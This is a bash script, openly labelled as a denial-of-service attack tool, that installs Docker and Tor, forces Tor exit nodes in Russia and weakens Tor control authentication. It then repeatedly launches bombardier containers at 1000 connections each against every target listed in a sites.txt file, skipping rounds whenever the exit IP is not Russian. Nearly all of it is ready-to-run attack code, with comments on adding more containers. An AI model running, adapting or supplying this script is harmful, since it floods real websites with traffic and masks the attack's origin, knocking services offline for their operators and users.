#!/bin/bash
# Full script for DoS attack using russian IP addresses.
# Installs Docker, Tor, configures Tor to use russian IP, initiates comtainers for attacks.
# Createt for Debian-based Linux, I used Ubuntu20.04. Feel free to change script to work on your distro.
# Created by Pavlo P.

# Docker install start
apt update && apt upgrade -y

apt install \
    ca-certificates \
    curl \
    gnupg \
    lsb-release

curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg

echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null

apt update && apt install docker-ce docker-ce-cli containerd.io -y
# Docker install finish

# Install tor
apt install tor -y

sed  '/ControlPort/s/^#//g' -i /etc/tor/torrc
sed 's/#CookieAuthentication 1/CookieAuthentication 0/' -i /etc/tor/torrc
echo "ExitNodes {ru}" >> /etc/tor/torrc # here we specify RU exit nodes (tor servers)
systemctl restart tor 2> /dev/null

echo "IP/Location before tor connection: $(curl --silent https://freegeoip.app/csv/$(wget -qO - https://api.ipify.org; echo))"
source torsocks on
echo "IP/Location after tor connection: $(curl --silent https://freegeoip.app/csv/$(wget -qO - https://api.ipify.org; echo))"
# Location should be RF, BUT SOMETIMES CHANGES TO US, idk why tbh. In the following script I jusk skip iteration, if IP is no russian.

# DoS script itself. Will run 4 (you can add more) bombardier containers for each URL/IP specified in sites.txt.
# Create sites.txt, put URL/IP addresses on each line.

# You can copy part below and put is in separate script, and launch it instead of this full script. 
echo "Starting bombardier containers..."

for i in {1..60}; do
   CURR_IP=$(wget -qO - https://api.ipify.org; echo)
   CHECK_IP=$(curl --silent https://freegeoip.app/csv/$CURR_IP; echo)
   if [[ $CHECK_IP =~ "Russia" ]]; then
      while IFS= read -r line; do
         docker run -d -it --rm alpine/bombardier -c 1000 -d 180s -l $line # you can change the amount of runs and connections
         docker run -d -it --rm alpine/bombardier -c 1000 -d 180s -l $line 
      done < sites.txt # Don't forget to create file with addresses
      sleep 180
   else
      echo "Location is not Russia, skipping iteration and updating IP..."
      sleep 20
   fi
   systemctl restart tor 2> /dev/null
   sleep 5
done